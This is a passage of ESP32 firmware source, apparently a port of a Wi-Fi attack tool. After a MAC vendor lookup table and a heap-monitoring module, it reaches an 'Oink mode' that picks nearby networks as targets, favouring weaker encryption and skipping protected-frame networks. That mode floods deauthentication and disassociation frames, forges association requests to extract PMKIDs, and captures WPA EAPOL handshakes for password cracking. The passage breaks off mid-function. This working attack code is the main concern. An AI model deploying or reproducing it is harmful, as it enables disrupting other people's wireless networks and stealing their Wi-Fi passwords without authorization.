  {{0x00,0x1D,0xBA},"Sony"},    {{0x00,0x1E,0xA4},"Sony"},
  {{0x00,0x24,0xBE},"Sony"},    {{0x00,0x26,0x43},"Sony"},
  {{0x28,0x0D,0xFC},"Sony"},    {{0x2C,0xCC,0x44},"Sony"},
  {{0x30,0xEB,0x25},"Sony"},    {{0x40,0xB8,0x37},"Sony"},
  {{0x78,0x84,0x3C},"Sony"},    {{0xA8,0xE3,0xEE},"Sony"},
  {{0xAC,0x89,0x95},"Sony"},    {{0xF8,0x46,0x1C},"Sony"},
  {{0xFC,0x0F,0xE6},"Sony"},
  // Dell
  {{0x00,0x06,0x5B},"Dell"},    {{0x00,0x08,0x74},"Dell"},
  {{0x00,0x0B,0xDB},"Dell"},    {{0x00,0x0D,0x56},"Dell"},
  {{0x00,0x0F,0x1F},"Dell"},    {{0x00,0x11,0x43},"Dell"},
  {{0x00,0x12,0x3F},"Dell"},    {{0x00,0x13,0x72},"Dell"},
  {{0x00,0x14,0x22},"Dell"},    {{0x00,0x15,0xC5},"Dell"},
  {{0x00,0x16,0xF0},"Dell"},    {{0x00,0x18,0x8B},"Dell"},
  {{0x00,0x19,0xB9},"Dell"},    {{0x00,0x1A,0xA0},"Dell"},
  {{0x00,0x1C,0x23},"Dell"},    {{0x00,0x1D,0x09},"Dell"},
  {{0x00,0x1E,0x4F},"Dell"},    {{0x00,0x1E,0xC9},"Dell"},
  {{0x00,0x21,0x70},"Dell"},    {{0x00,0x21,0x9B},"Dell"},
  {{0x00,0x22,0x19},"Dell"},    {{0x00,0x23,0xAE},"Dell"},
  {{0x00,0x24,0xE8},"Dell"},    {{0x00,0x25,0x64},"Dell"},
  {{0x00,0x26,0xB9},"Dell"},
  // Lenovo
  {{0x00,0x06,0x1B},"Lenovo"},  {{0x00,0x09,0x2D},"Lenovo"},
  {{0x00,0x0A,0xE4},"Lenovo"},  {{0x00,0x12,0xFE},"Lenovo"},
  {{0x00,0x16,0x41},"Lenovo"},  {{0x00,0x1A,0x6B},"Lenovo"},
  {{0x00,0x1E,0x37},"Lenovo"},  {{0x00,0x1F,0x16},"Lenovo"},
  {{0x00,0x21,0x5E},"Lenovo"},  {{0x00,0x22,0x68},"Lenovo"},
  {{0x00,0x24,0x7E},"Lenovo"},  {{0x00,0x26,0x6C},"Lenovo"},
  {{0x28,0xD2,0x44},"Lenovo"},  {{0x2C,0x59,0xE5},"Lenovo"},
  {{0x40,0x1C,0x83},"Lenovo"},  {{0x54,0xE1,0xAD},"Lenovo"},
  {{0x60,0x02,0x92},"Lenovo"},  {{0x6C,0x0B,0x84},"Lenovo"},
  {{0x70,0xF1,0xA1},"Lenovo"},  {{0x84,0x7B,0xEB},"Lenovo"},
  {{0x98,0xFA,0x9B},"Lenovo"},  {{0xB8,0x70,0xF4},"Lenovo"},
  {{0xC4,0x34,0x6B},"Lenovo"},  {{0xD8,0xD3,0x85},"Lenovo"},
  {{0xE8,0x40,0xF2},"Lenovo"},  {{0xF0,0x4D,0xA2},"Lenovo"},
  // LG
  {{0x00,0x05,0xC9},"LG"},      {{0x00,0x1C,0x62},"LG"},
  {{0x00,0x1E,0x75},"LG"},      {{0x00,0x1F,0x6B},"LG"},
  {{0x00,0x1F,0xE3},"LG"},      {{0x00,0x22,0xA9},"LG"},
  {{0x00,0x24,0x83},"LG"},      {{0x00,0x25,0xE5},"LG"},
  {{0x00,0x26,0xE2},"LG"},      {{0x10,0x68,0x3F},"LG"},
  {{0x14,0xC9,0x13},"LG"},      {{0x20,0x21,0xA5},"LG"},
  {{0x30,0x76,0x6F},"LG"},      {{0x34,0x4D,0xF7},"LG"},
  {{0x38,0x8C,0x50},"LG"},      {{0x40,0xB0,0xFA},"LG"},
  {{0x58,0x3F,0x54},"LG"},      {{0x64,0x99,0x5D},"LG"},
  {{0x6C,0xDC,0x6A},"LG"},      {{0x78,0x5D,0xC8},"LG"},
  {{0x88,0xC9,0xD0},"LG"},      {{0xA0,0x39,0xF7},"LG"},
  {{0xBC,0xF5,0xAC},"LG"},      {{0xC4,0x36,0x6C},"LG"},
  {{0xCC,0x2D,0x8C},"LG"},      {{0xE8,0x5B,0x5B},"LG"},
  {{0xF8,0x0D,0xAC},"LG"},
  // Raspberry Pi
  {{0xB8,0x27,0xEB},"RaspbPi"}, {{0xDC,0xA6,0x32},"RaspbPi"},
  {{0xE4,0x5F,0x01},"RaspbPi"},
  // Espressif (ESP32/ESP8266)
  {{0x24,0x0A,0xC4},"Espressif"},{{0x24,0x62,0xAB},"Espressif"},
  {{0x24,0x6F,0x28},"Espressif"},{{0x24,0xB2,0xDE},"Espressif"},
  {{0x30,0xAE,0xA4},"Espressif"},{{0x3C,0x61,0x05},"Espressif"},
  {{0x3C,0x71,0xBF},"Espressif"},{{0x4C,0x11,0xAE},"Espressif"},
  {{0x4C,0x75,0x25},"Espressif"},{{0x5C,0xCF,0x7F},"Espressif"},
  {{0x60,0x01,0x94},"Espressif"},{{0x68,0xC6,0x3A},"Espressif"},
  {{0x80,0x7D,0x3A},"Espressif"},{{0x84,0x0D,0x8E},"Espressif"},
  {{0x84,0xCC,0xA8},"Espressif"},{{0x84,0xF3,0xEB},"Espressif"},
  {{0x8C,0xAA,0xB5},"Espressif"},{{0x94,0xB9,0x7E},"Espressif"},
  {{0x98,0xCD,0xAC},"Espressif"},{{0xA0,0x20,0xA6},"Espressif"},
  {{0xA4,0x7B,0x9D},"Espressif"},{{0xA4,0xCF,0x12},"Espressif"},
  {{0xAC,0x67,0xB2},"Espressif"},{{0xB4,0xE6,0x2D},"Espressif"},
  {{0xBC,0xDD,0xC2},"Espressif"},{{0xC4,0x4F,0x33},"Espressif"},
  {{0xC8,0x2B,0x96},"Espressif"},{{0xCC,0x50,0xE3},"Espressif"},
  {{0xD8,0xA0,0x1D},"Espressif"},{{0xD8,0xBF,0xC0},"Espressif"},
  {{0xDC,0x4F,0x22},"Espressif"},{{0xE0,0x98,0x06},"Espressif"},
  {{0xE8,0xDB,0x84},"Espressif"},{{0xEC,0x94,0xCB},"Espressif"},
  {{0xEC,0xFA,0xBC},"Espressif"},{{0xF4,0xCF,0xA2},"Espressif"},
  {{0xFC,0xF5,0xC4},"Espressif"},
  // HonHai (Foxconn)
  {{0x00,0x01,0x6C},"HonHai"},  {{0x00,0x16,0xEA},"HonHai"},
  {{0x00,0x19,0x7D},"HonHai"},  {{0x00,0x19,0x7E},"HonHai"},
  {{0x00,0x1C,0x26},"HonHai"},  {{0x00,0x1F,0x3A},"HonHai"},
  {{0x00,0x22,0x68},"HonHai"},  {{0x00,0x23,0x4D},"HonHai"},
  {{0x00,0x24,0x2B},"HonHai"},  {{0x00,0x24,0x2C},"HonHai"},
  {{0x04,0x4B,0xED},"HonHai"},  {{0x48,0x5D,0x60},"HonHai"},
  {{0x4C,0xBB,0x58},"HonHai"},  {{0x60,0xD8,0x19},"HonHai"},
  {{0x64,0xD9,0x54},"HonHai"},  {{0x68,0x94,0x23},"HonHai"},
  {{0x74,0x2F,0x68},"HonHai"},  {{0x9C,0xD2,0x1E},"HonHai"},
  {{0xA0,0xC5,0x89},"HonHai"},  {{0xB4,0xB6,0x76},"HonHai"},
  {{0xBC,0xEE,0x7B},"HonHai"},  {{0xDC,0x85,0xDE},"HonHai"},
  {{0xE8,0x2A,0xEA},"HonHai"},  {{0xF4,0x8C,0x50},"HonHai"},
};
static const uint16_t OUI_TABLE_SIZE = sizeof(OUI_TABLE)/sizeof(OUI_TABLE[0]);

const char* getVendor(const uint8_t* mac) {
  static char buf[10];
  if (mac[0] & 0x02) return "RANDOM";  // locally-administered / randomized MAC
  for (uint16_t i = 0; i < OUI_TABLE_SIZE; i++) {
    if (mac[0] == pgm_read_byte(&OUI_TABLE[i].oui[0]) &&
        mac[1] == pgm_read_byte(&OUI_TABLE[i].oui[1]) &&
        mac[2] == pgm_read_byte(&OUI_TABLE[i].oui[2])) {
      strncpy_P(buf, OUI_TABLE[i].vendor, sizeof(buf)-1);
      buf[sizeof(buf)-1] = '\0';
      return buf;
    }
  }
  return "UNKNOWN";
}

} // namespace OUI

// ============================================================
// HEAP HEALTH — EMA-smoothed heap monitoring, pressure levels,
// fragmentation metric, Knuth's Rule. Zero-allocation design.
// Faithful port of src/core/heap_health.cpp + heap_policy.h
// ============================================================

namespace HeapPolicy {
  static constexpr size_t   kMinHeapForTls              = 35000;
  static constexpr size_t   kMinContigForTls             = 35000;
  static constexpr size_t   kProactiveTlsConditioning    = 45000;
  static constexpr uint32_t kHealthSampleIntervalMs      = 1000;
  static constexpr uint32_t kHealthToastDurationMs       = 5000;
  static constexpr uint8_t  kHealthToastMinDelta         = 5;
  static constexpr uint32_t kHealthToastSettleMs         = 3000;
  static constexpr uint8_t  kHealthConditionTriggerPct   = 65;
  static constexpr uint8_t  kHealthConditionClearPct     = 75;
  static constexpr float    kHealthFragPenaltyScale      = 0.60f;
  static constexpr float    kDisplayEmaAlphaDown         = 0.10f;
  static constexpr float    kDisplayEmaAlphaUp           = 0.20f;
  static constexpr uint32_t kConditionCooldownMinMs      = 15000;
  static constexpr uint32_t kConditionCooldownMaxMs      = 60000;
  static constexpr uint32_t kConditionCooldownBaseMs     = 30000;
  static constexpr size_t   kPressureLevel1Free          = 80000;
  static constexpr size_t   kPressureLevel2Free          = 50000;
  static constexpr size_t   kPressureLevel3Free          = 30000;
  static constexpr float    kPressureLevel1Frag          = 0.60f;
  static constexpr float    kPressureLevel2Frag          = 0.40f;
  static constexpr float    kPressureLevel3Frag          = 0.25f;
  static constexpr uint32_t kPressureHysteresisMs        = 3000;
  static constexpr uint8_t  kMaxPressureLevelForSDWrite  = 1;
  static constexpr float    kKnuthRatioWarning           = 0.70f;
}

enum class HeapPressureLevel : uint8_t {
  Normal=0, Caution=1, Warning=2, Critical=3
};

namespace HeapHealth {

static uint8_t  _pct         = 100;
static uint32_t _lastSampleMs= 0;
static size_t   _peakFree    = 0;
static size_t   _peakLargest = 0;
static size_t   _minFree     = 0;
static size_t   _minLargest  = 0;
static float    _displayPctF = 100.0f;
static uint8_t  _stablePct   = 100;
static bool     _pendingToast= false;
static uint32_t _pendingToastMs = 0;
static uint32_t _lastToastMs = 0;
static bool     _condPending = false;
static uint32_t _lastCondMs  = 0;
static HeapPressureLevel _pressure = HeapPressureLevel::Normal;
static uint32_t _lastPressureMs = 0;
static uint8_t  _escalation  = 0;
static float    _knuthRatio  = 0.0f;
static bool     _knuthEnabled= false;

static uint8_t _computePct(size_t freeH, size_t largest, bool updatePeaks) {
  if (updatePeaks) {
    if (freeH    > _peakFree)    _peakFree    = freeH;
    if (largest  > _peakLargest) _peakLargest = largest;
  }
  float fNorm = _peakFree    > 0 ? (float)freeH   / (float)_peakFree    : 0.0f;
  float cNorm = _peakLargest > 0 ? (float)largest  / (float)_peakLargest : 0.0f;
  float tNorm = 1.0f;
  if (HeapPolicy::kMinHeapForTls > 0 && HeapPolicy::kMinContigForTls > 0) {
    float fg = (float)freeH   / (float)HeapPolicy::kMinHeapForTls;
    float cg = (float)largest / (float)HeapPolicy::kMinContigForTls;
    tNorm = fg < cg ? fg : cg;
  }
  float h = fNorm < cNorm ? fNorm : cNorm;
  if (tNorm < h) h = tNorm;
  float frag = freeH > 0 ? (float)largest / (float)freeH : 0.0f;
  float pen  = frag / HeapPolicy::kHealthFragPenaltyScale;
  if (pen < 0.0f) pen = 0.0f;
  if (pen > 1.0f) pen = 1.0f;
  h *= pen;
  if (h < 0.0f) h = 0.0f;
  if (h > 1.0f) h = 1.0f;
  int p = (int)(h * 100.0f + 0.5f);
  if (p < 0) p = 0; if (p > 100) p = 100;
  return (uint8_t)p;
}

static HeapPressureLevel _computePressure(size_t freeH, float frag) {
  if (freeH < HeapPolicy::kPressureLevel3Free || frag < HeapPolicy::kPressureLevel3Frag) return HeapPressureLevel::Critical;
  if (freeH < HeapPolicy::kPressureLevel2Free || frag < HeapPolicy::kPressureLevel2Frag) return HeapPressureLevel::Warning;
  if (freeH < HeapPolicy::kPressureLevel1Free || frag < HeapPolicy::kPressureLevel1Frag) return HeapPressureLevel::Caution;
  return HeapPressureLevel::Normal;
}

static uint32_t _adaptiveCooldown(size_t largest) {
  if (HeapPolicy::kMinContigForTls == 0) return HeapPolicy::kConditionCooldownBaseMs;
  float r = (float)largest / (float)HeapPolicy::kMinContigForTls;
  uint32_t c = (uint32_t)((float)HeapPolicy::kConditionCooldownBaseMs * r);
  if (c < HeapPolicy::kConditionCooldownMinMs) c = HeapPolicy::kConditionCooldownMinMs;
  if (c > HeapPolicy::kConditionCooldownMaxMs) c = HeapPolicy::kConditionCooldownMaxMs;
  return c;
}

void update() {
  uint32_t now = millis();
  if (now - _lastSampleMs < HeapPolicy::kHealthSampleIntervalMs) return;
  _lastSampleMs = now;

  size_t freeH   = ESP.getFreeHeap();
  size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
  if (_peakFree == 0 || _peakLargest == 0) { _peakFree = freeH; _peakLargest = largest; }
  if (_minFree    == 0 || freeH   < _minFree)    _minFree    = freeH;
  if (_minLargest == 0 || largest < _minLargest)  _minLargest = largest;

  uint8_t newPct = _computePct(freeH, largest, true);
  _pct = newPct;

  static bool _first = true;
  if (_first) { _displayPctF = (float)newPct; _stablePct = newPct; _first = false; }
  else {
    float alpha = (newPct < _displayPctF) ? HeapPolicy::kDisplayEmaAlphaDown : HeapPolicy::kDisplayEmaAlphaUp;
    _displayPctF += alpha * ((float)newPct - _displayPctF);
  }

  float frag = freeH > 0 ? (float)largest / (float)freeH : 0.0f;

  if (_knuthEnabled) {
    multi_heap_info_t info;
    heap_caps_get_info(&info, MALLOC_CAP_8BIT);
    if (info.allocated_blocks > 0)
      _knuthRatio = (float)info.free_blocks / (float)info.allocated_blocks;
  }

  // Pressure level with hysteresis
  HeapPressureLevel newLvl = _computePressure(freeH, frag);
  if (newLvl != _pressure) {
    if (newLvl > _pressure) {
      _escalation++;
      uint8_t thresh = (newLvl == HeapPressureLevel::Critical) ? 1 : 2;
      if (_escalation >= thresh) { _pressure = newLvl; _lastPressureMs = now; _escalation = 0; }
    } else if ((now - _lastPressureMs) >= HeapPolicy::kPressureHysteresisMs) {
      _pressure = newLvl; _lastPressureMs = now; _escalation = 0;
    }
  } else { _escalation = 0; }

  // Adaptive conditioning trigger
  bool contigLow = largest < HeapPolicy::kProactiveTlsConditioning;
  bool pctLow    = newPct  <= HeapPolicy::kHealthConditionTriggerPct;
  uint32_t cd    = _adaptiveCooldown(largest);
  if (!_condPending) {
    if (pctLow && contigLow && (_lastCondMs == 0 || (now - _lastCondMs) >= cd))
      _condPending = true;
  } else {
    if (newPct >= HeapPolicy::kHealthConditionClearPct && largest >= HeapPolicy::kProactiveTlsConditioning)
      _condPending = false;
  }

  // Debounced toast on significant health change
  uint8_t smoothed = (uint8_t)(_displayPctF + 0.5f);
  int delta = (int)smoothed - (int)_stablePct;
  uint8_t deltaAbs = (delta < 0) ? (uint8_t)(-delta) : (uint8_t)delta;
  if (deltaAbs >= HeapPolicy::kHealthToastMinDelta) {
    if (!_pendingToast) { _pendingToast = true; _pendingToastMs = now; }
    if ((now - _pendingToastMs >= HeapPolicy::kHealthToastSettleMs) &&
        (now - _lastToastMs    >= HeapPolicy::kHealthToastDurationMs)) {
      bool improved = delta > 0;
      char buf[32];
      snprintf(buf, sizeof(buf), "HEAP %s %d%%", improved ? "UP" : "DOWN", (int)smoothed);
      Display::showToast(buf, 3000);
      _lastToastMs = now;
      _stablePct = smoothed;
      _pendingToast = false;
    }
  } else { _pendingToast = false; _stablePct = smoothed; }
}

uint8_t            getPercent()        { return _pct; }
uint8_t            getDisplayPercent() { int p=(int)(_displayPctF+0.5f); if(p<0)p=0; if(p>100)p=100; return (uint8_t)p; }
HeapPressureLevel  getPressureLevel()  { return _pressure; }
float              getKnuthRatio()     { return _knuthRatio; }
uint32_t           getMinFree()        { return (uint32_t)_minFree; }
uint32_t           getMinLargest()     { return (uint32_t)_minLargest; }
void               setKnuthEnabled(bool e) { _knuthEnabled = e; if(!e) _knuthRatio = 0.0f; }
bool               consumeConditionRequest() { if(!_condPending) return false; _condPending=false; return true; }

void resetPeaks() {
  _peakFree    = ESP.getFreeHeap();
  _peakLargest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
  _pct         = _computePct(_peakFree, _peakLargest, false);
  _condPending = false; _lastCondMs = millis();
  _stablePct = _pct; _displayPctF = (float)_pct; _pendingToast = false;
}

} // namespace HeapHealth

// ============================================================
// OINK MODE — deauth + EAPOL handshake + PMKID capture
// Faithful port of src/modes/oink.cpp
// ============================================================
namespace OinkMode {

// ── Types ────────────────────────────────────────────────────
using Net = DetectedNetwork;

// ── Auto-attack states ───────────────────────────────────────
enum class AutoState { SCANNING, PMKID_HUNTING, LOCKING, ATTACKING, WAITING, NEXT_TARGET, BORED };

// ── Timing constants ─────────────────────────────────────────
static const uint32_t SCAN_TIME            = 5000;
static const uint32_t ATTACK_TIMEOUT       = 15000;
static const uint32_t WAIT_TIME            = 4500;
static const uint32_t BORED_RETRY_TIME     = 30000;
static const uint32_t DEAUTH_BURST_MS      = 180;
static const uint32_t CLIENT_RECENT_MS     = 10000;
static const uint32_t LOCK_FAST_TRACK_MS   = 2500;
static const uint32_t LOCK_EARLY_EXIT_MS   = 4000;
static const uint32_t LOCK_TIME            = 6000;
static const uint32_t TARGET_WARMUP_MIN_MS = 1500;
static const uint32_t TARGET_WARMUP_FORCE_MS = 5000;
static const uint32_t TARGET_WARMUP_MIN_PKTS = 200;
static const uint32_t PMKID_TIMEOUT        = 300;
static const uint32_t PMKID_HUNT_MAX       = 30000;
static const uint8_t  BORED_THRESHOLD      = 3;
static const uint8_t  TARGET_MAX_ATTEMPTS  = 4;
static const uint8_t  DEAUTH_BURST_COUNT   = 5;

// ── State ────────────────────────────────────────────────────
static bool      _running        = false;
static bool      _deauthing      = false;
static bool      _channelHopping = true;
static AutoState _autoState      = AutoState::SCANNING;
static uint32_t  _stateStart     = 0;
static uint32_t  _attackStart    = 0;
static uint32_t  _lastDeauth     = 0;
static uint32_t  _lastMood       = 0;
static uint32_t  _lastHop        = 0;
static uint32_t  _lastSniff      = 0;
static uint32_t  _lastCleanup    = 0;
static uint32_t  _lastBoredUpd   = 0;
static uint32_t  _oinkStartMs    = 0;
static uint32_t  _reconPktStart  = 0;
static uint8_t   _consecutiveFail= 0;

// Target tracking
static int      _tgtIdx          = -1;
static uint8_t  _tgtBssid[6]     = {0};
static char     _lastPwnedSSID[33]= {0};
static uint32_t _deauthTotal     = 0;

// PMKID hunting
static int      _pmkidTgtIdx     = -1;
static uint32_t _pmkidProbeTime  = 0;
static uint64_t _pmkidProbedBits = 0;

// WAITING state
static bool _checkedPending  = false;
static bool _hasPending      = false;

// Handshake / PMKID storage
static std::vector<CapturedHandshake> _handshakes;
static std::vector<CapturedPMKID>     _pmkids;

// BOAR BROS exclusion (excluded BSSIDs — no heap, fixed array)
static const uint8_t MAX_BOAR_BROS = 50;
static uint64_t _boarBros[MAX_BOAR_BROS];
static uint8_t  _boarCount = 0;

// Pending handshake ring buffer (ISR-safe: no heap ops in callback)
struct PendingHS { uint8_t bssid[6], sta[6]; EAPOLFrame frame; uint8_t msg; };
#define OINK_HS_RING 4
static PendingHS _hsRing[OINK_HS_RING];
static volatile uint8_t _hsW=0, _hsR=0;
static portMUX_TYPE _hsMux = portMUX_INITIALIZER_UNLOCKED;

// Pending PMKID ring buffer
struct PendingPMK { uint8_t bssid[6], sta[6], pmkid[16]; };
#define OINK_PMK_RING 4
static PendingPMK _pmkRing[OINK_PMK_RING];
static volatile uint8_t _pmkW=0, _pmkR=0;
static portMUX_TYPE _pmkMux = portMUX_INITIALIZER_UNLOCKED;

// ── Exclusion helpers ────────────────────────────────────────
static uint64_t _bssidKey(const uint8_t* b) {
  uint64_t k=0; for(int i=0;i<6;i++) k=(k<<8)|b[i]; return k;
}
static bool _isExcluded(const uint8_t* b) {
  uint64_t k=_bssidKey(b);
  for(int i=0;i<_boarCount;i++) if(_boarBros[i]==k) return true;
  return false;
}

// ── Warm-up gate ─────────────────────────────────────────────
static bool _isWarm(uint32_t now) {
  if (_oinkStartMs == 0) return true;
  uint32_t e = now - _oinkStartMs;
  if (e < TARGET_WARMUP_MIN_MS) return false;
  if (e >= TARGET_WARMUP_FORCE_MS) return true;
  if (NetworkRecon::getPacketCount() - _reconPktStart >= TARGET_WARMUP_MIN_PKTS) return true;
  if (NetworkRecon::getNetworkCount() >= 2) return true;
  return false;
}

// ── Target scoring ───────────────────────────────────────────
static int _score(const Net& net, uint32_t now) {
  int8_t rssi = net.rssiAvg ? net.rssiAvg : net.rssi;
  int s = 0;
  // RSSI
  if      (rssi >= -30) s += 60;
  else if (rssi > -95)  s += (int)((rssi+95)*60/65);
  // Recency
  uint32_t age = now - net.lastSeen;
  if      (age <= 2000)  s += 20;
  else if (age <= 5000)  s += 12;
  else if (age <= 15000) s += 5;
  // Data frames seen
  if (net.lastDataSeen > 0) {
    uint32_t da = now - net.lastDataSeen;
    if      (da <= 3000)  s += 20;
    else if (da <= 10000) s += 10;
    else if (da <= 30000) s += 5;
  }
  // Proximity bonus
  if      (rssi >= -40) s += 25;
  else if (rssi >= -50) s += 15;
  // Recent client proximity bonus
  if (net.lastDataSeen>0 && (now-net.lastDataSeen)<=CLIENT_RECENT_MS) s += 30;
  else if (net.lastDataSeen>0 && (now-net.lastDataSeen)<=CLIENT_RECENT_MS*3) s += 10;
  else s -= 5;
  // Auth mode preference (weaker = more likely to crack)
  switch (net.authmode) {
    case WIFI_AUTH_WEP:           s += 15; break;
    case WIFI_AUTH_WPA_PSK:       s += 10; break;
    case WIFI_AUTH_WPA_WPA2_PSK:  s +=  5; break;
    case WIFI_AUTH_WPA2_WPA3_PSK: s -=  5; break;
    case WIFI_AUTH_WPA3_PSK:      s -= 10; break;
    default: break;
  }
  // Penalise repeatedly-tried targets
  s -= (int)net.attackAttempts * 8;
  return s;
}

static bool _isEligible(const Net& net, uint32_t now) {
  if (!net.ssid[0] || net.isHidden) return false;
  if (net.cooldownUntil > now)      return false;
  if (net.hasPMF)                   return false;
  if (net.hasHandshake)             return false;
  if (net.authmode == WIFI_AUTH_OPEN) return false;
  if (net.attackAttempts >= TARGET_MAX_ATTEMPTS) return false;
  int8_t rssi = net.rssiAvg ? net.rssiAvg : net.rssi;
  if (rssi < -80) return false;
  return true;
}

// Pick best target index — prefers recent-client targets, falls back to best score
static int _getNextTarget() {
  uint32_t now = millis();
  if (!_isWarm(now)) return -1;
  int bestIdx = -1, bestScore = -100000;
  int rcIdx   = -1, rcScore  = -100000;
  NetworkRecon::enterCritical();
  auto& nets = NetworkRecon::getNetworks();
  for (int i=0; i<(int)nets.size(); i++) {
    const Net& n = nets[i];
    if (_isExcluded(n.bssid)) continue;
    if (!_isEligible(n, now))  continue;
    int sc = _score(n, now);
    if (sc > bestScore) { bestScore = sc; bestIdx = i; }
    if (n.lastDataSeen>0 && (now-n.lastDataSeen)<=CLIENT_RECENT_MS && n.attackAttempts < TARGET_MAX_ATTEMPTS) {
      if (sc > rcScore) { rcScore = sc; rcIdx = i; }
    }
  }
  NetworkRecon::exitCritical();
  return rcIdx >= 0 ? rcIdx : bestIdx;
}

// ── Channel helpers ──────────────────────────────────────────
static const uint8_t HOP_ORDER[] = {1,6,11,2,3,4,5,7,8,9,10,12,13};
static uint8_t _hopIdx = 0;
static void _hopChannel() {
  _hopIdx = (_hopIdx+1) % 13;
  NetworkRecon::setChannel(HOP_ORDER[_hopIdx]);
}
static void _setChannel(uint8_t ch) {
  NetworkRecon::lockChannel(ch);
}

// ── Deauth helpers ───────────────────────────────────────────
static void _sendBurst(const uint8_t* bssid, const uint8_t* sta, uint8_t n) {
  for (uint8_t i=0; i<n; i++) {
    WSLBypasser::sendDeauthFrame(bssid, NetworkRecon::getChannel(), sta, 7);
    WSLBypasser::sendDisassocFrame(bssid, NetworkRecon::getChannel(), sta, 8);
  }
}

// ── PMKID association probe ──────────────────────────────────
static void _sendAssocProbe(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
  // Build a probe request / association request targeting bssid
  // This triggers M1 from the AP which may contain PMKID in key data
  uint8_t ourMac[6];
  esp_wifi_get_mac(WIFI_IF_STA, ourMac);
  uint8_t frame[64]; size_t off=0;
  frame[off++]=0x00; frame[off++]=0x00;  // FC: assoc request
  frame[off++]=0x00; frame[off++]=0x00;  // duration
  memcpy(frame+off, bssid, 6); off+=6;   // DA
  memcpy(frame+off, ourMac, 6); off+=6;  // SA
  memcpy(frame+off, bssid, 6); off+=6;   // BSSID
  frame[off++]=0x00; frame[off++]=0x00;  // seq
  frame[off++]=0x21; frame[off++]=0x00;  // cap: ESS+shortPreamble
  frame[off++]=0x0A; frame[off++]=0x00;  // listen interval
  frame[off++]=0x00;                     // SSID IE
  frame[off++]=(uint8_t)ssidLen;
  if (ssidLen>0 && ssidLen<=32) { memcpy(frame+off,ssid,ssidLen); off+=ssidLen; }
  esp_wifi_80211_tx(WIFI_IF_STA, frame, off, false);
}

// ── EAPOL promiscuous callback ───────────────────────────────
static void IRAM_ATTR _eapolCallback(wifi_promiscuous_pkt_t* pkt, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MISC) return;
  const uint8_t* buf = pkt->payload;
  uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;
  if (len < 26) return;

  // Parse 802.11 frame control
  uint16_t fc = ((uint16_t)buf[1]<<8)|buf[0];
  uint8_t ftype   = (fc>>2)&0x3;
  uint8_t subtype = (fc>>4)&0xF;
  if (ftype != 2) return;  // data frames only

  // Resolve src/dst MAC from toDS/fromDS
  bool toDS   = (fc>>8)&1;
  bool fromDS = (fc>>9)&1;
  const uint8_t* srcMac;
  const uint8_t* dstMac;
  if (!toDS && !fromDS)     { srcMac=buf+10; dstMac=buf+4;  }
  else if (!toDS && fromDS) { srcMac=buf+16; dstMac=buf+4;  }
  else if (toDS && !fromDS) { srcMac=buf+10; dstMac=buf+16; }
  else                      { srcMac=buf+24; dstMac=buf+16; }

  // QoS adds 2 bytes to header
  uint8_t baseOff = 24;
  if (subtype & 0x8) baseOff += 2;

  if (len < (uint16_t)(baseOff+8)) return;
  // LLC/SNAP: AA AA 03 00 00 00 88 8E
  if (buf[baseOff]!=0xAA||buf[baseOff+1]!=0xAA||buf[baseOff+2]!=0x03) return;
  if (buf[baseOff+6]!=0x88||buf[baseOff+7]!=0x8E) return;

  uint16_t eapolOff = baseOff+8;
  if (len<(uint16_t)(eapolOff+4)) return;
  if (buf[eapolOff+1]!=0x03) return;  // EAPOL-Key

  uint16_t keyInfoOff = eapolOff+5;
  if (len<(uint16_t)(keyInfoOff+2)) return;
  uint16_t keyInfo = ((uint16_t)buf[keyInfoOff]<<8)|buf[keyInfoOff+1];

  bool keyAck  = (keyInfo>>7)&1;
  bool keyMic  = (keyInfo>>8)&1;
  bool install = (keyInfo>>6)&1;
  bool secure  = (keyInfo>>9)&1;

  uint8_t msg=0;
  if ( keyAck&&!keyMic&&!install&&!secure) msg=1;
  if (!keyAck&& keyMic&&!install&&!secure) msg=2;
  if ( keyAck&& keyMic&& install&&!secure) msg=3;
  if (!keyAck&& keyMic&&!install&& secure) msg=4;
  if (!msg) return;

  const uint8_t* bssid = keyAck ? srcMac : dstMac;
  const uint8_t* sta   = keyAck ? dstMac : srcMac;

  // Check PMKID KDE in M1: dd 14 00 0f ac 04
  if (msg==1) {
    uint16_t kdLenOff=eapolOff+97;
    if (len>=(uint16_t)(kdLenOff+2)) {
      uint16_t kdLen=((uint16_t)buf[kdLenOff]<<8)|buf[kdLenOff+1];
      uint16_t kdOff=kdLenOff+2;
      for (uint16_t p=kdOff; p+22<=kdOff+kdLen&&p+22<=(uint16_t)len; p++) {
        if (buf[p]==0xDD&&buf[p+1]==0x14&&buf[p+2]==0x00&&buf[p+3]==0x0F&&buf[p+4]==0xAC&&buf[p+5]==0x04) {
          portENTER_CRITICAL_ISR(&_pmkMux);
          uint8_t w=(_pmkW+1)%OINK_PMK_RING;
          if (w!=_pmkR){
            memcpy(_pmkRing[_pmkW].bssid,bssid,6);
            memcpy(_pmkRing[_pmkW].sta,  sta,  6);
            memcpy(_pmkRing[_pmkW].pmkid,buf+p+6,16);
            _pmkW=w;
          }
          portEXIT_CRITICAL_ISR(&_pmkMux);
          break;
        }
      }
    }
  }

  // Queue EAPOL frame for main-thread processing
  uint16_t copyLen = len-eapolOff;
  if (copyLen>sizeof(EAPOLFrame::data)) copyLen=sizeof(EAPOLFrame::data);

  portENTER_CRITICAL_ISR(&_hsMux);
  uint8_t w=(_hsW+1)%OINK_HS_RING;
  if (w!=_hsR) {
    PendingHS& slot=_hsRing[_hsW];
    memcpy(slot.bssid,bssid,6);
    memcpy(slot.sta,  sta,  6);
    slot.msg=msg;
    slot.frame.len=copyLen;
    slot.frame.messageNum=msg;
    slot.frame.timestamp=0;
    memcpy(slot.frame.data,buf+eapolOff,copyLen);
    _hsW=w;
  }
  portEXIT_CRITICAL_ISR(&_hsMux);
}

// ── Main thread: process pending ring buffers ────────────────
static void _processPending() {
  // Process handshake frames
  while (_hsR != _hsW) {
    portENTER_CRITICAL(&_hsMux);
    uint8_t r = _hsR;
    PendingHS slot = _hsRing[r];
    _hsR = (r+1) % OINK_HS_RING;
    portEXIT_CRITICAL(&_hsMux);

    // Find or create handshake entry
    CapturedHandshake* hs = nullptr;
    for (auto& h : _handshakes) {
      if (memcmp(h.bssid,slot.bssid,6)==0 && memcmp(h.station,slot.sta,6)==0) { hs=&h; break; }
    }
    if (!hs) {
      if (_handshakes.size() < 50) {
